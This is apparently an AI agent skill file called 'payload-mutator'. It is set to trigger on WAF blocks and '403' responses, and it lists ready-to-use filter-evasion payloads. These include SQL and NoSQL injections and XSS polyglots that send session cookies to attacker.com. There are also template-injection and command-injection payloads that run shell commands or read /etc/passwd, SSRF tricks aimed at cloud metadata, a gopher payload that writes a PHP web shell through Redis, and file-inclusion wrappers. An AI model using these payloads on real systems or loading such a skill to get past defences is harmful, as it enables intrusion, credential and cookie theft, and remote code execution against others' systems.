---
name: payload-mutator
description: WAF bypass and payload mutation engine. Use when WAF blocks payloads, filters intercept requests, or evasion is needed. Triggers on "waf", "block", "403", "forbidden", "bypass", "mutate", "encode", "filter".
category: evasion
tags: waf,bypass,mutate,encode,filter,403,forbidden,block,evasion
---

# Payload Mutator

## SQLi WAF & Filter Bypasses

### Comment Splitting
```
/*!50000SELECT*/ 1,2,user()
```

### Inline Comments
```
UN/**/ION/**/SEL/**/ECT 1,version()
```

### Case & Whitespace Alternation
```
%09uNiOn%0bSeLeCt%0c1,table_name%0aFrOm%0dinformation_schema.tables
```

### URL Double Encoding
```
%2527%2520UNION%2520SELECT%2520NULL%252Cschema_name%2520FROM%2520information_schema.schemata
```

### Hex / Char Literals
```
0x61646d696e (admin)
CHAR(97,100,109,105,110)
```

### Scientific Notation
```
1.0union select null,concat(0x3a,schema_name) from information_schema.schemata
```

### Blind Boolean Extraction
```
' OR (SELECT SUBSTRING(version(),1,1))='8'--
```

### Time-Based Stacked
```
';WAITFOR DELAY '0:0:5'--
';SELECT pg_sleep(5)--
' OR sleep(5)='
```

## NoSQL Injection (MongoDB/CouchDB)

### Regex Bypass
```
{"$regex": ".*"}
{"$gt": ""}
{"$ne": null}
```

### Where Function JS Injection
```
{"$where": "this.password.match(/^a/)"}
{"$where": "sleep(5000)"}
```

## XSS & Client-Side Polyglots

### Omnipotent Polyglot
```
jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=fetch('//attacker.com/?c='+btoa(document.cookie)) )//%0D%0A//</stYle/<titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

### SVG Namespace Smuggling
```
<svg><animate onbegin=fetch('//attacker.com/'+document.cookie) attributeName=x dur=1s>
```

### Tag/Event Attribute Obfuscation
```
<img/src/onerror=this.src='http://attacker.com/'+document.cookie>
```

### DOM Prototype Pollution
```
?__proto__[innerHTML]=<img/src/onerror=alert(1)>
```

## SSTI (Server-Side Template Injection) Cross-Engine

### Jinja2 (Python)
```
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
```

### Jinja2 Filter Bypass
```
{{lipsum.__globals__['os'].popen('id').read()}}
{{url_for.__globals__['os'].popen('id').read()}}
```

### Twig (PHP)
```
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### FreeMarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

### Spring Expression (SpEL)
```
T(java.lang.Runtime).getRuntime().exec("id")
```

## Command Injection & Shell Evasion

### Char / IFS Smuggling
```
;echo${IFS}"RCE";
{cat,/etc/passwd}
```

### Env Var Substring Extraction
```
${PATH:0:1}bin${PATH:0:1}cat${IFS}/etc/passwd
```

### Base64 Pipeline
```
echo$IFS$1"Y2F0IC9ldGMvcGFzc3dk"|base64$IFS-d|sh
```

### Hex/Octal Escapes
```
$'\\x63\\x61\\x74' /etc/passwd
$'\\143\\141\\x74' /etc/passwd
```

### Wildcard Expansion
```
/???/??t /???/p??s??
```

## SSRF & Cloud Metadata Protocol Tricks

### Octal IP
```
http://017700000001 (127.0.0.1)
```

### Hex IP
```
http://0x7f000001
```

### Dword Decimal IP
```
http://2130706433
```

### IPv6 Embedded
```
http://[::ffff:127.0.0.1]
http://[::1]
```

### Enclosed Alphanumerics
```
http://①②⑦.⓪.⓪.①
```

### URI Schema Authority Confusion
```
http://attacker.com#@169.254.169.254/latest/meta-data/
```

### DNS Rebinding
```
http://make-169-254-169-254-rebind.127.0.0.1.nip.io
```

### Gopher/Dict SSRF (Redis RCE)
```
gopher://127.0.0.1:6379/_flushall%0D%0Aset%201%20%22%3C%3Fphp%20system(%24_GET%5B'c'%5D)%3B%20%3F%3E%22%0D%0Aconfig%20set%20dir%20/var/www/html%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Asave
```

## LFI / File Inclusion Stream Wrappers

### PHP Filter B64
```
php://filter/convert.base64-encode/resource=index.php
```

### PHP Data URI
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
```

### Path Normalization
```
....//....//....//etc/passwd
..%252f..%252fetc/passwd
```

## Output Format

```
[EVADE] <evasion technique> against <defense>
  Result: <success/failure>
  Detection risk: <low/medium/high>
```
